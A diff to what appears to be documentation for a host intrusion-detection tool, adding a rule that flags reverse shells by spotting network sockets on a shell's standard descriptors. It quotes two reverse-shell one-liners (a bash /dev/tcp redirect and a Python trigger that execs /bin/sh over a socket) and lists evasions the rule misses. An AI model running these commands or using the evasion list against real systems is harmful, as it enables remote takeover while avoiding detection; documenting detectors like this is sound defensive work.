@@ -175,6 +175,40 @@ command-injection shape.
   name; the daemon table is also not exhaustive. A *known* interpreter is covered
   separately and much more quietly — see below.
 
+### `socket_backed_shell` — base 70 · T1059.004, T1571
+A shell exec'd with an **AF_INET/AF_INET6 socket on fd 0, 1 or 2** — the reverse
+shell. Detected at `sched_process_exec` by walking the new program's descriptor
+table; the flag is set in-kernel and the decision about which executables matter
+is made in userspace.
+
+`shell_from_network_daemon` asks who the parent is and structurally cannot catch
+this: `bash -i >& /dev/tcp/host/4444 0>&1` has no recognisable daemon in its
+ancestry because it does not need one. What identifies a reverse shell is the
+descriptor, not the lineage. Measured before this existed: the full connect →
+`dup2` → `exec /bin/sh` sequence produced no signal at all.
+
+- **AF_UNIX is deliberately excluded.** Socketpairs are ordinary IPC between
+  cooperating processes; counting them would make this fire all day for nothing.
+  The shape worth reporting is commands arriving over a network connection.
+- **Restricted to shells, and that is the whole false-positive story.** inetd,
+  xinetd and systemd units with `Accept=yes` exec their service with the accepted
+  connection already on fd 0/1/2 — the identical descriptor shape. Matching the
+  descriptor alone would make every socket-activated service an incident. Pinned
+  by `tests/noise/inetd_style_service.sh`, which execs `/bin/date` that way and
+  must stay silent.
+- **Interpreters are excluded** for the same reason, more sharply: a
+  socket-activated service written in Python is ordinary, and the interpreter
+  list is broad.
+- **Trigger:** `python3 -c 'import os,socket;s=socket.create_connection((h,p));[os.dup2(s.fileno(),f) for f in (0,1,2)];os.execv("/bin/sh",["/bin/sh"])'`
+- **False positives:** a shell *deliberately* run against a socket — a
+  remote-administration tool built that way, or a debugging session. Rare enough
+  to baseline rather than design around.
+- **Evasions:** a shell that opens the socket itself after exec is not caught,
+  because the descriptor is not yet a socket when the exec happens. Neither is a
+  payload that is not a recognised shell — the same limit
+  `interpreter_from_network_daemon` documents. A socket moved onto fd 0 *after*
+  exec, by the shell itself, is invisible to a check made at exec time.
+
 ### `interpreter_from_network_daemon` — base 25 · T1059
 The same ancestry, and an **interpreter** instead of a shell: `python`, `perl`,
 `ruby`, `php`, `node`, `lua`, `tclsh`, `awk`. Versioned names (`python3.11`,
